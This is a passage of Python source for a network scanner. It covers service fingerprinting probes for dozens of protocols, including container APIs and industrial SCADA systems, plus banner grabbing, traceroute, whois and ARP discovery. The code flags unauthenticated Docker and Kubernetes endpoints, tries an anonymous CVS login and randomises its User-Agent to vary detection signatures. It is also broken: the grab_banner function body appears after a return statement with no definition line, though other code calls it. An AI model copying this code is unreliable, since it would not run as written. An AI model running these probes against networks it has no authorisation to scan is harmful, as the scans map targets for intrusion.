        [(r"(?s)Linux\s*([\d.]+)",                       r"Linux \1 (SNMP)"),
         (r"(?s)Cisco IOS\s*([\d.(]+\w*)",               r"Cisco IOS \1 (SNMP)"),
         (r"(?s)Windows.*?(\d{4})",                      r"Windows \1 (SNMP)"),
         (r"(?s)HP.*?JetDirect",                         r"HP JetDirect (SNMP)"),
         (r"\x30\x82",                                   r"SNMP (GetResponse OK)")]),

    # ── NTP ─────────────────────────────────────────────────────────
    ProbeSpec("NTP", [123],
        b"\x1b" + b"\x00" * 47,
        [(r"\x1c",                                       r"NTP (server response)"),
         (r".",                                           r"NTP")]),

    # ── BGP ─────────────────────────────────────────────────────────
    ProbeSpec("BGP", [179],
        b"\xff" * 16 + b"\x00\x1d\x01\x04\x00\x00\x00\xb4\x00\x00\x00\x00\x00",
        [(r"\xff{16}",                                   r"BGP (OPEN received)"),
         (r"\xff{16}.*?\x03",                            r"BGP (NOTIFICATION — peer active)")]),

    # ── OSPF ─────────────────────────────────────────────────────────
    ProbeSpec("OSPF", [89],
        b"\x02\x01\x00\x2c\x00\x00\x00\x01\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00"
        b"\x00\x0a\x12\x01\x00\x00\x00\x28",
        [(r"\x02\x02",                                   r"OSPF (Database Description)"),
         (r"\x02",                                        r"OSPF packet")]),

    # ── DHCP ─────────────────────────────────────────────────────────
    ProbeSpec("DHCP", [67, 68],
        b"\x01\x01\x06\x00" + b"\xde\xad\xbe\xef" + b"\x00" * 232 +
        b"\x63\x82\x53\x63\x35\x01\x01\xff",
        [(r"\x02\x01\x06\x00",                          r"DHCP server (OFFER)"),
         (r"\x63\x82\x53\x63",                          r"DHCP")]),

    # ── SOCKS5 ───────────────────────────────────────────────────────
    ProbeSpec("SOCKS5", [1080, 1081],
        b"\x05\x03\x00\x01\x02",
        [(r"\x05\x00",                                  r"SOCKS5 (no auth required)"),
         (r"\x05\x02",                                  r"SOCKS5 (username/password auth)"),
         (r"\x05\xff",                                  r"SOCKS5 (no acceptable auth)"),
         (r"\x05",                                       r"SOCKS5")]),

    # ── SOCKS4 ───────────────────────────────────────────────────────
    ProbeSpec("SOCKS4", [1080],
        b"\x04\x01\x00\x50\x00\x00\x00\x01test\x00",
        [(r"\x00\x5a",                                  r"SOCKS4 (request granted)"),
         (r"\x00\x5b",                                  r"SOCKS4 (request rejected)")]),

    # ─── HTTP Proxy ──────────────────────────────────────────────────
    ProbeSpec("HTTP-Proxy", [3128, 8118, 8888],
        b"GET http://pyscanner.local/ HTTP/1.0\r\n\r\n",
        [(r"Squid/([\d.]+)",                             r"Squid proxy \1"),
         (r"Privoxy/([\d.]+)",                           r"Privoxy \1"),
         (r"(?i)proxy",                                  r"HTTP proxy"),
         (r"HTTP/[\d.]+ (200|407)",                      r"HTTP proxy (\1)")]),

    # ═══════════════════════════════════════════════════════════════
    # CONTAINERS / ORCHESTRATION / DEVOPS
    # ═══════════════════════════════════════════════════════════════

    # ── Docker ───────────────────────────────────────────────────────
    ProbeSpec("Docker", [2375],
        b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"Version"\s*:\s*"([\d.]+)"',                r"Docker \1 (UNAUTHENTICATED)"),
         (r'"ApiVersion"\s*:\s*"([\d.]+)"',             r"Docker API v\1"),
         (r'docker',                                     r"Docker API (unauthenticated)")]),

    ProbeSpec("Docker-TLS", [2376],
        b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"Version"\s*:\s*"([\d.]+)"',                r"Docker \1 (TLS)"),
         (r'docker',                                     r"Docker API (TLS)")],
        ssl=True),

    # ── Kubernetes ───────────────────────────────────────────────────
    ProbeSpec("Kubernetes", [6443],
        b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"gitVersion"\s*:\s*"v([\d.]+)"',            r"Kubernetes v\1"),
         (r'kubernetes',                                 r"Kubernetes API")],
        ssl=True),

    ProbeSpec("Kubernetes-Insecure", [8080],
        b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"gitVersion"\s*:\s*"v([\d.]+)"',            r"Kubernetes v\1 (UNAUTHENTICATED)"),
         (r'kubernetes',                                 r"Kubernetes API (insecure port)")]),

    # ── etcd ─────────────────────────────────────────────────────────
    ProbeSpec("etcd", [2379, 2380],
        b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"etcdserver"\s*:\s*"([\d.]+)"',             r"etcd \1"),
         (r'etcd',                                       r"etcd")]),

    # ── Consul ───────────────────────────────────────────────────────
    ProbeSpec("Consul", [8500, 8501],
        b"GET /v1/agent/self HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"Config".*?"Version"\s*:\s*"([\d.]+)"',     r"Consul \1"),
         (r'consul',                                     r"HashiCorp Consul")]),

    # ── Vault ─────────────────────────────────────────────────────────
    ProbeSpec("Vault", [8200],
        b"GET /v1/sys/health HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"version"\s*:\s*"([\d.]+)"',                r"HashiCorp Vault \1"),
         (r'vault',                                      r"HashiCorp Vault")]),

    # ── Nomad ─────────────────────────────────────────────────────────
    ProbeSpec("Nomad", [4646],
        b"GET /v1/agent/self HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"Version"\s*:\s*"([\d.]+)"',                r"HashiCorp Nomad \1"),
         (r'nomad',                                      r"HashiCorp Nomad")]),

    # ── Prometheus ───────────────────────────────────────────────────
    ProbeSpec("Prometheus", [9090],
        b"GET /-/healthy HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r"Prometheus Server is Healthy",              r"Prometheus (healthy)"),
         (r"prometheus",                                 r"Prometheus")]),

    # ── Grafana ───────────────────────────────────────────────────────
    ProbeSpec("Grafana", [3000],
        b"GET /api/health HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"version"\s*:\s*"([\d.]+)"',                r"Grafana \1"),
         (r'"database"\s*:\s*"ok"',                     r"Grafana (healthy)"),
         (r'grafana',                                    r"Grafana")]),

    # ── Kubernetes Dashboard ──────────────────────────────────────────
    ProbeSpec("K8s-Dashboard", [8001, 30000],
        b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r"Kubernetes Dashboard",                       r"Kubernetes Dashboard"),
         (r'"kind"\s*:\s*"Status"',                     r"Kubernetes API proxy")]),

    # ── Jenkins ──────────────────────────────────────────────────────
    ProbeSpec("Jenkins", [8080],
        b"GET /api/json HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"hudson"\s*:',                               r"Jenkins CI"),
         (r'X-Jenkins:\s*([\d.]+)',                      r"Jenkins \1"),
         (r'Jenkins',                                    r"Jenkins CI")]),

    # ── GitLab ────────────────────────────────────────────────────────
    ProbeSpec("GitLab", [80, 443, 8080],
        b"GET /users/sign_in HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r"GitLab.*?([\d.]+)",                         r"GitLab \1"),
         (r'gitlab',                                     r"GitLab")]),

    # ─── SonarQube ────────────────────────────────────────────────────
    ProbeSpec("SonarQube", [9000],
        b"GET /api/system/status HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"version"\s*:\s*"([\d.]+)"',                r"SonarQube \1"),
         (r'sonar',                                      r"SonarQube")]),

    # ── Jupyter ───────────────────────────────────────────────────────
    ProbeSpec("Jupyter", [8888, 8889],
        b"GET /api HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"version"\s*:\s*"([\d.]+)"',                r"Jupyter Notebook \1"),
         (r'jupyter',                                    r"Jupyter Notebook")]),

    # ── MinIO ─────────────────────────────────────────────────────────
    ProbeSpec("MinIO", [9000],
        b"GET /minio/health/live HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r"X-Minio-Deployment-Id",                     r"MinIO object storage"),
         (r"minio",                                      r"MinIO")]),

    # ═══════════════════════════════════════════════════════════════
    # PRINT / NETWORK SERVICES
    # ═══════════════════════════════════════════════════════════════

    # ── IPP ───────────────────────────────────────────────────────────
    ProbeSpec("IPP", [631],
        b"POST / HTTP/1.0\r\nContent-Type: application/ipp\r\nContent-Length: 0\r\n\r\n",
        [(r"CUPS/([\d.]+)",                             r"CUPS \1"),
         (r"IPP",                                        r"IPP printer")]),

    # ── LPD ───────────────────────────────────────────────────────────
    ProbeSpec("LPD", [515],
        b"\x00\n",
        [(r".",                                           r"LPD printer daemon")]),

    # ── JetDirect ─────────────────────────────────────────────────────
    ProbeSpec("JetDirect", [9100],
        b"\x1b%-12345X@PJL INFO STATUS\r\n\x1b%-12345X",
        [(r"@PJL",                                       r"HP JetDirect (PJL)"),
         (r"READY",                                      r"HP JetDirect (READY)"),
         (r".",                                           r"Printer (raw/JetDirect)")]),

    # ═══════════════════════════════════════════════════════════════
    # MONITORING / MANAGEMENT
    # ═══════════════════════════════════════════════════════════════

    # ── IPMI ─────────────────────────────────────────────────────────
    ProbeSpec("IPMI", [623],
        b"\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09"
        b"\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5",
        [(r"\x06\x00\xff\x07",                          r"IPMI/BMC (RMCP+)"),
         (r".",                                           r"IPMI/RMCP")]),

    # ── NRPE ─────────────────────────────────────────────────────────
    ProbeSpec("NRPE", [5666],
        b"\x00\x00\x00\x00\x02\x00\x00\x09\x00\x00\x00\x00" + b"\x00" * 1024,
        [(r"NRPE",                                       r"Nagios NRPE agent"),
         (r"\x00\x00\x00\x00\x02\x00",                  r"NRPE (response)")]),

    # ── Zabbix ────────────────────────────────────────────────────────
    ProbeSpec("Zabbix", [10050, 10051],
        b"ZBXD\x01\x00\x00\x00\x00\x00\x00\x00\x00{\"request\":\"active checks\",\"host\":\"pyscanner\"}\n",
        [(r"ZBXD",                                       r"Zabbix agent"),
         (r'"response"\s*:\s*"success"',                 r"Zabbix (active)")]),

    # ── Ganglia ───────────────────────────────────────────────────────
    ProbeSpec("Ganglia", [8649, 8651],
        b"<ganglia>\n",
        [(r"<GANGLIA_XML",                               r"Ganglia gmond"),
         (r"ganglia",                                    r"Ganglia monitoring")]),

    # ── DCERPC ────────────────────────────────────────────────────────
    ProbeSpec("DCERPC", [135, 593],
        b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
        b"\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
        b"\xc4\xfe\xfc\x99\x60\x52\x1b\x10\xbb\xcb\x00\xaa\x00\x21\x34\x7a"
        b"\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
        b"\x2b\x10\x48\x60\x02\x00\x00\x00",
        [(r"\x05\x00\x0c",                              r"DCERPC (BIND ACK — EPM)"),
         (r"\x05\x00",                                  r"DCERPC (Microsoft RPC)")]),

    # ── WinRM ─────────────────────────────────────────────────────────
    ProbeSpec("WinRM", [5985, 5986],
        b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r"Microsoft-HTTPAPI/([\d.]+)",                r"WinRM (Windows Remote Management) \1"),
         (r"WSMAN",                                      r"WinRM/WSMan")],
        ssl=False),

    # ── Splunk ────────────────────────────────────────────────────────
    ProbeSpec("Splunk", [8089, 9997],
        b"GET /services/server/info HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"version">([\d.]+)<',                       r"Splunk \1"),
         (r'Splunk',                                     r"Splunk")]),

    # ═══════════════════════════════════════════════════════════════
    # INDUSTRIAL / IOT / SCADA
    # ═══════════════════════════════════════════════════════════════

    # ── Modbus ───────────────────────────────────────────────────────
    ProbeSpec("Modbus", [502],
        b"\x00\x00\x00\x00\x00\x06\x01\x04\x00\x00\x00\x01",
        [(r"\x00\x00\x00\x00",                         r"Modbus TCP (MBAP OK)"),
         (r".",                                          r"Modbus TCP")]),

    # ── DNP3 ──────────────────────────────────────────────────────────
    ProbeSpec("DNP3", [20000],
        b"\x05\x64\x14\xc4\x03\x00\x00\x04\x00\x00"
        b"\xc0\xc0\x01\x3c\x02\x06\x3c\x03\x06\x3c\x04\x06\x3c\x01\x06",
        [(r"\x05\x64",                                  r"DNP3 (SCADA/ICS)"),
         (r".",                                          r"DNP3")]),

    # ── BACnet ────────────────────────────────────────────────────────
    ProbeSpec("BACnet", [47808],
        b"\x81\x0b\x00\x0c\x01\x20\xff\xff\x00\xff\x10\x08",
        [(r"\x81\x0b",                                  r"BACnet/IP (building automation)"),
         (r".",                                          r"BACnet/IP")]),

    # ── EtherNet/IP ──────────────────────────────────────────────────
    ProbeSpec("EtherNetIP", [44818],
        b"\x65\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        [(r"\x65\x00",                                  r"EtherNet/IP (industrial CIP)"),
         (r".",                                          r"EtherNet/IP")]),

    # ── IEC 60870-5-104 ──────────────────────────────────────────────
    ProbeSpec("IEC104", [2404],
        b"\x68\x04\x07\x00\x00\x00",
        [(r"\x68\x04\x0b",                             r"IEC 60870-5-104 (SCADA/RTU)"),
         (r"\x68",                                      r"IEC 104 APCI frame")]),

    # ═══════════════════════════════════════════════════════════════
    # MISC WELL-KNOWN SERVICES
    # ═══════════════════════════════════════════════════════════════

    # ── IRC ───────────────────────────────────────────────────────────
    ProbeSpec("IRC", [6667, 6697, 7000],
        b"NICK pyscanner\r\nUSER pyscanner 0 * :PyScannerProbe\r\n",
        [(r":([^ ]+) 001 ",                             r"IRC server (\1)"),
         (r"(?i)ircd",                                  r"IRCd"),
         (r":(\S+) NOTICE",                             r"IRC (\1)")]),

    # ── XMPP ─────────────────────────────────────────────────────────
    ProbeSpec("XMPP", [5222, 5269],
        b"<?xml version='1.0'?><stream:stream to='localhost' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>",
        [(r"<?xml.*?stream:stream",                     r"XMPP server"),
         (r"ejabberd",                                  r"ejabberd XMPP"),
         (r"Openfire",                                  r"Openfire XMPP")]),

    # ── SIP ───────────────────────────────────────────────────────────
    ProbeSpec("SIP", [5060, 5061],
        b"OPTIONS sip:localhost SIP/2.0\r\nVia: SIP/2.0/UDP localhost:5060\r\nMax-Forwards: 70\r\nTo: sip:localhost\r\nFrom: sip:pyscanner@localhost;tag=abc123\r\nCall-ID: pyscanner@localhost\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n",
        [(r"SIP/2\.0 (\d{3})",                         r"SIP \1"),
         (r"Server:\s*([\w/ .]+)",                      r"SIP (\1)"),
         (r"(?i)asterisk",                              r"Asterisk VoIP"),
         (r"(?i)freeswitch",                            r"FreeSWITCH VoIP")]),

    # ── RTSP ─────────────────────────────────────────────────────────
    ProbeSpec("RTSP", [554, 8554],
        b"OPTIONS rtsp://localhost RTSP/1.0\r\nCSeq: 1\r\n\r\n",
        [(r"RTSP/1\.0 (\d{3})",                        r"RTSP \1"),
         (r"Server:\s*([\w/ .]+)",                      r"RTSP (\1)"),
         (r"(?i)wowza",                                 r"Wowza Streaming Engine"),
         (r"(?i)live555",                               r"LIVE555 RTSP server")]),

    # ── RSync ─────────────────────────────────────────────────────────
    ProbeSpec("RSync", [873],
        b"@RSYNCD: 31.0\n",
        [(r"@RSYNCD:\s*([\d.]+)",                      r"rsync \1"),
         (r"@RSYNCD",                                   r"rsync daemon")]),

    # ── CVS ───────────────────────────────────────────────────────────
    ProbeSpec("CVS", [2401],
        b"BEGIN AUTH REQUEST\n/tmp\nanonymous\nanonymous\nEND AUTH REQUEST\n",
        [(r"I LOVE YOU",                                r"CVS pserver (anonymous OK)"),
         (r"E ",                                        r"CVS pserver (error)")]),

    # ── SVN ───────────────────────────────────────────────────────────
    ProbeSpec("SVN", [3690],
        b"( 2 ( edit-pipeline svndiff1 ) ) ",
        [(r"\( success \( \( \d+",                     r"SVN (svnserve OK)"),
         (r"\( success",                                r"SVN (svnserve)")]),

    # ── Git ───────────────────────────────────────────────────────────
    ProbeSpec("Git", [9418],
        b"\x00\x00\x00\x2fgit-upload-pack /.\x00host=localhost\x00",
        [(r"ERR",                                        r"Git (git-daemon error)"),
         (r"\x30{4}",                                   r"Git (git-daemon OK)")]),

    # ── Apache ZooKeeper ─────────────────────────────────────────────
    ProbeSpec("ZooKeeper", [2181, 2182],
        b"ruok",
        [(r"imok",                                      r"ZooKeeper (imok — healthy)"),
         (r".",                                          r"ZooKeeper")]),

    # ── Hadoop NameNode ───────────────────────────────────────────────
    ProbeSpec("Hadoop", [50070, 9870],
        b"GET /jmx?qry=Hadoop:service=NameNode,name=NameNodeStatus HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"Version"\s*:\s*"([\d.]+)"',               r"Hadoop NameNode \1"),
         (r'"State"\s*:\s*"(active|standby)"',          r"Hadoop NameNode (\1)"),
         (r'hadoop',                                    r"Hadoop NameNode")]),

    # ── Spark ─────────────────────────────────────────────────────────
    ProbeSpec("Spark", [4040, 8080, 7077],
        b"GET /api/v1/applications HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"id"\s*:\s*"local-',                       r"Apache Spark (local mode)"),
         (r'"id"\s*:\s*"app-',                         r"Apache Spark"),
         (r'Spark',                                     r"Apache Spark UI")]),

    # ── Solr ─────────────────────────────────────────────────────────
    ProbeSpec("Solr", [8983],
        b"GET /solr/admin/info/system?wt=json HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"solr-spec-version"\s*:\s*"([\d.]+)"',     r"Apache Solr \1"),
         (r'solr',                                      r"Apache Solr")]),

    # ── Apache Flink ─────────────────────────────────────────────────
    ProbeSpec("Flink", [8081],
        b"GET /config HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"flink-version"\s*:\s*"([\d.]+)"',         r"Apache Flink \1"),
         (r'flink',                                     r"Apache Flink")]),

    # ── Airflow ───────────────────────────────────────────────────────
    ProbeSpec("Airflow", [8080],
        b"GET /api/v1/health HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"metadatabase"\s*:\s*\{"status"\s*:\s*"healthy"', r"Apache Airflow (healthy)"),
         (r'airflow',                                    r"Apache Airflow")]),
]

# Build port→probe index for O(1) lookup during scan
_PROBE_INDEX: Dict[int, List[ProbeSpec]] = {}
for _ps in SERVICE_PROBE_DB:
    for _port in _ps.ports:
        _PROBE_INDEX.setdefault(_port, []).append(_ps)


def run_service_probe(ip: str, port: int, timeout: float = 3.0) -> Tuple[str, str]:
    """
    [UPG-1] Run all matching probes for `port` against `ip`.
    Returns (version_string, raw_banner).
    Tries each ProbeSpec in order; returns first match.
    Falls back to plain banner grab if no DB entry exists.
    """
    probes = _PROBE_INDEX.get(port, [])

    for spec in probes:
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(timeout)
            raw_sock.connect((ip, port))

            sock: Any = raw_sock
            if spec.ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                try:
                    sock = ctx.wrap_socket(raw_sock, server_hostname=ip)
                except ssl.SSLError:
                    sock = raw_sock

            if spec.payload:
                sock.sendall(spec.payload)

            banner_bytes = b""
            try:
                banner_bytes = sock.recv(4096)
            except socket.timeout:
                pass
            try:
                sock.close()
            except Exception:
                pass

            banner = banner_bytes.decode("utf-8", errors="replace").strip()

            for pattern, template in spec.matches:
                m = re.search(pattern, banner, re.IGNORECASE | re.DOTALL)
                if m:
                    try:
                        version = m.expand(template)
                    except re.error:
                        version = template
                    return version, banner

        except Exception:
            continue

    # No DB probe matched — fall back to generic banner
    banner = grab_banner(ip, port, timeout)
    version = extract_service_version(banner)
    return version, banner


def extract_service_version(banner: str) -> str:
    """
    [FIX-34] Match banner against SERVICE_VERSION_PATTERNS to extract
    a human-readable software name and version string.
    Returns empty string if nothing matches.
    """
    for pattern, template in SERVICE_VERSION_PATTERNS:
        m = re.search(pattern, banner, re.IGNORECASE)
        if m:
            try:
                return m.expand(template)
            except re.error:
                return template
    return ""
    """
    Grab service banner from an open port.
    [FIX-17] Uses ssl.create_default_context() for SSL-wrapped ports.
    [FIX-19] Randomised User-Agent to vary HTTP probe signatures.
    [FIX-23] Extended protocol-specific probes for 20+ services.
             Each probe matches the protocol's real handshake sequence.
    """
    ua_id = random.randint(10000, 99999)
    http_probe = (
        f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n"
        f"User-Agent: Mozilla/5.0 (compatible; Scanner/{ua_id})\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    # [FIX-23] Protocol-specific probes
    _probes: Dict[int, bytes] = {
        # File transfer / remote access
        21:   b"",                             # FTP: server sends banner first
        22:   b"",                             # SSH: server sends banner first
        23:   b"",                             # Telnet: server sends options first

        # Mail
        25:   b"EHLO scanner.local\r\n",       # SMTP EHLO
        110:  b"",                             # POP3: server sends +OK first
        143:  b"",                             # IMAP: server sends * OK first
        465:  http_probe,                      # SMTPS (over SSL)
        587:  b"EHLO scanner.local\r\n",       # SMTP submission
        993:  b"",                             # IMAPS: server sends first
        995:  b"",                             # POP3S: server sends first

        # Web
        80:   http_probe,
        443:  http_probe,
        8080: http_probe,
        8443: http_probe,
        8888: http_probe,

        # Databases
        3306: b"",                             # MySQL: server sends handshake
        5432: b"",                             # PostgreSQL: server sends first
        6379: b"PING\r\n",                     # Redis: expects PONG
        27017: b"\x3a\x00\x00\x00\x01\x00\x00\x00"  # MongoDB OP_QUERY ping
               b"\x00\x00\x00\x00\xd4\x07\x00\x00"
               b"\x00\x00\x00\x00admin.$cmd\x00"
               b"\x00\x00\x00\x00\x01\x00\x00\x00"
               b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00",

        # Directory / messaging
        389:  b"",                             # LDAP: wait for server
        5672: b"AMQP\x00\x00\x09\x01",        # RabbitMQ AMQP greeting

        # Monitoring
        9200: (                                # Elasticsearch REST
               b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"),
        11211: b"version\r\n",                 # Memcached
    }

    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(timeout)
        raw_sock.connect((ip, port))

        if port in SSL_PORTS:
            # [FIX-17] Recommended ssl.create_default_context() idiom
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            try:
                sock = ctx.wrap_socket(raw_sock, server_hostname=ip)
            except ssl.SSLError:
                sock = raw_sock
        else:
            sock = raw_sock

        probe = _probes.get(port, b"")
        if probe:
            sock.sendall(probe)

        banner_bytes = b""
        try:
            banner_bytes = sock.recv(2048)
        except socket.timeout:
            pass

        try:
            sock.close()
        except Exception:
            pass

        banner = banner_bytes.decode("utf-8", errors="replace").strip()
        for line in banner.splitlines():
            line = line.strip()
            if line:
                return line[:200]
        return ""
    except Exception:
        return ""


# ─────────────────────────────────────────────
# HTTP Header Grabber
# ─────────────────────────────────────────────

def fetch_http_headers(ip: str, port: int = 80,
                       use_https: bool = False,
                       timeout: float = 5.0) -> Dict[str, str]:
    if not HAS_URLLIB:
        return {}
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{ip}:{port}/"
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    attempts = [True, False] if use_https else [False]
    for with_ssl in attempts:
        try:
            req = _urllib_req.Request(
                url, headers={"User-Agent": "PyScanner/2.0"})
            kw: dict = {"timeout": timeout}
            if with_ssl:
                kw["context"] = ctx
            with _urllib_req.urlopen(req, **kw) as resp:
                headers = dict(resp.getheaders())
                headers["_status_code"] = str(resp.status)
                headers["_url"] = url
                return headers
        except Exception:
            continue
    return {}


# ─────────────────────────────────────────────
# Traceroute
# ─────────────────────────────────────────────

def traceroute(target_ip: str, max_hops: int = 30,
               timeout: float = 2.0) -> List[Dict]:
    hops: List[Dict] = []
    for ttl in range(1, max_hops + 1):
        hop: Dict = {"ttl": ttl, "ip": "*",
                     "hostname": "*", "rtt_ms": None}
        recv_sock = None
        send_sock = None
        try:
            recv_sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            send_sock = socket.socket(
                socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
            recv_sock.settimeout(timeout)
            recv_sock.bind(("", 0))    # bind to ephemeral port each TTL
            t0 = time.time()
            send_sock.sendto(b"PyScanner", (target_ip, 33434 + ttl))
            try:
                _, addr = recv_sock.recvfrom(512)
                rtt = round((time.time() - t0) * 1000, 2)
                hop["ip"]       = addr[0]
                hop["hostname"] = reverse_dns(addr[0]) or addr[0]
                hop["rtt_ms"]   = rtt
            except socket.timeout:
                pass
        except PermissionError:
            hop["ip"] = "requires-root"
            hops.append(hop)
            break
        except Exception as exc:
            hop["ip"] = f"error:{exc}"
        finally:
            if send_sock:
                send_sock.close()
            if recv_sock:
                recv_sock.close()

        hops.append(hop)
        if hop["ip"] == target_ip:
            break

    return hops


# ─────────────────────────────────────────────
# [FIX-11] Whois – proper referral chain
# ─────────────────────────────────────────────

def _raw_whois_query(server: str, query: str,
                     timeout: float = 8.0) -> str:
    """Query a whois server directly via TCP port 43."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((server, 43))
        s.sendall((query + "\r\n").encode())
        chunks = []
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        s.close()


def do_whois(target: str) -> str:
    """
    [FIX-11] Two-step whois:
      1. Query whois.iana.org to get the authoritative referral server.
      2. Follow the 'refer:' line and query the real server.
    Previously queried only IANA which returns referral metadata, not
    full whois records.
    """
    if HAS_WHOIS:
        try:
            w = pywhois.whois(target)
            return str(w)[:3000]
        except Exception:
            pass

    # Step 1: IANA query for referral
    try:
        iana_resp = _raw_whois_query("whois.iana.org", target)
    except Exception:
        return "Whois: IANA query failed"

    # Step 2: Parse 'refer:' line
    refer_server: Optional[str] = None
    for line in iana_resp.splitlines():
        m = re.match(r"(?i)refer:\s*(\S+)", line.strip())
        if m:
            refer_server = m.group(1).strip()
            break

    if not refer_server:
        return iana_resp[:3000]

    # Step 3: Query the authoritative whois server
    try:
        real_resp = _raw_whois_query(refer_server, target)
        return real_resp[:3000]
    except Exception:
        return iana_resp[:3000]


# ─────────────────────────────────────────────
# [FIX-6] ARP Scan - cross-platform
# ─────────────────────────────────────────────

def _arp_scan_linux_raw(network: str, timeout: float) -> List[Dict]:
    """Linux AF_PACKET ARP scan. Requires root."""
    results: List[Dict] = []
    try:
        hosts = expand_cidr(network)
    except Exception:
        return results

    ETH_P_ARP = 0x0806
    ETH_P_ALL = 0x0003

    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                          socket.htons(ETH_P_ALL))
        s.settimeout(timeout)
    except (AttributeError, OSError, PermissionError):
        return results

    try:
        iface   = _get_default_iface()
        s.bind((iface, 0))
        src_mac = _get_mac(iface)
        src_ip  = get_local_ip()
    except Exception:
        s.close()
        return results

    src_mac_b = bytes.fromhex(src_mac.replace(":", ""))
    broadcast  = b"\xff\xff\xff\xff\xff\xff"

    for dst_ip in hosts:
        dst_ip_b = socket.inet_aton(dst_ip)
        eth = broadcast + src_mac_b + struct.pack("!H", ETH_P_ARP)
        arp = struct.pack("!HHBBH6s4s6s4s",
            1, 0x0800, 6, 4, 1,   # HTYPE, PTYPE, HLEN, PLEN, OP=REQUEST
            src_mac_b, socket.inet_aton(src_ip),
            b"\x00" * 6, dst_ip_b)
        try:
            s.send(eth + arp)
        except Exception:
            continue

    deadline = time.time() + timeout
    seen: set = set()
    while time.time() < deadline:
        try:
            frame, _ = s.recvfrom(2048)
            if len(frame) < 42:
                continue
            eth_type = struct.unpack("!H", frame[12:14])[0]
            if eth_type != ETH_P_ARP:
                continue
            arp_op = struct.unpack("!H", frame[20:22])[0]
            if arp_op != 2:    # ARP Reply
                continue
            sender_mac = ":".join(f"{b:02x}" for b in frame[22:28])
            sender_ip  = socket.inet_ntoa(frame[28:32])
            if sender_ip not in seen:
                seen.add(sender_ip)
                results.append({"ip": sender_ip, "mac": sender_mac})
        except socket.timeout:
            break
        except Exception:
            break

    s.close()
    return results


def _arp_scan_subprocess(network: str) -> List[Dict]:
    """
    [FIX-6] Cross-platform ARP discovery via external tools.
    Tries: arp-scan -> nmap -sn -> arp cache (passive).
    Works on macOS and Windows as well as Linux without raw sockets.
    """
    results: List[Dict] = []

    # Option A: arp-scan (Linux, needs root)
    try:
        out = subprocess.check_output(
            ["arp-scan", "--localnet", "--quiet"],
            stderr=subprocess.DEVNULL, timeout=15)
        for line in out.decode(errors="replace").splitlines():
            m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F:]{17})", line)
            if m:
                results.append({"ip": m.group(1), "mac": m.group(2)})
        if results:
            return results
    except Exception:
        pass

    # Option B: nmap ping scan
    try:
        out = subprocess.check_output(
            ["nmap", "-sn", "-PR", network, "-oG", "-"],
            stderr=subprocess.DEVNULL, timeout=30)
        for line in out.decode(errors="replace").splitlines():
            m = re.search(r"Host: (\d+\.\d+\.\d+\.\d+)", line)
            if m and "Up" in line:
                results.append({"ip": m.group(1), "mac": "unknown"})
        if results:
            return results
    except Exception:
        pass

    # Option C: read OS ARP cache (passive, no root required)
    try:
